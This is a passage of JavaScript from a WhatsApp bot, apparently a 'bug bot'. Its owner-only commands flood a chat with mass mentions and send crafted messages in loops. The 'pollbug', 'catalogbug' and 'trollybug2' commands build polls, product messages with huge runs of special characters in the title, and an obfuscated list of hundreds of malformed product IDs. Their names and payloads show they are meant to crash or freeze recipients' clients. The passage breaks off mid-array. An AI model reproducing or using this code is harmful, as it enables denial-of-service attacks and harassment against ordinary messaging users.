                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${botname}`
for (let i = 0; i < amount; i++) {
let teks = `â•â•âœªã€˜ * TAGALL LMAO ðŸ¦„* ã€™âœªâ•â•
 ${themeemoji} *Message : ${q ? q : 'empty'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })}
}
}
break
case 'pollbug': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${botname}`
for (let i = 0; i < amount; i++) {
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": ownername,
"options": [
{
"optionName": `${themeemoji}`
},
{
"optionName": `${themeemoji}`
},
{
"optionName": `${themeemoji}`
},
{
"optionName": `${themeemoji}`
},
{
"optionName": `${themeemoji}`
}
],
"selectableOptionsCount": 5
}
}), { userJid: m.chat, quoted: doc })
XeonBotInc.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
}
xbug('Successful in sending the poll bug')
}
break

case 'catalogbug': {

                if (!isCreator) return m.reply(`${mess.owner}`)
                if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpicvirus.png') }, { upload: XeonBotInc.waUploadToServer })
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `[â«¹â«º - ã‘’ ${botname}]\ ðŸ¦‡Ì£Ì£Ì£Ì£Ì£Ì£Ì£Ì£âƒŸ   ...ð›€..ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦??ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦??ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦??ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦ð‘œ¦`,
"description": wm,
"currencyCode": "INR",
"footerText": ownername,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": wm,
"url": websitex
},
"businessOwnerJid": "916909137213@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
XeonBotInc.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
case 'trollybug2': {

                if (!isCreator) return m.reply(`${mess.owner}`)
                if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','Xeon\x20Bug\x20WhatsApp','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt',' 916909137213@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await XeonBotInc[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'Â©\x20'+ownername,'jpegThumbnail':xpicvirus}}};var xeonordy=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+xeonbutton2,'description':_0x588892(0x1fc)+xeonbutton2,'thumbnail':xpicvirus,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+xeonbutton2,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'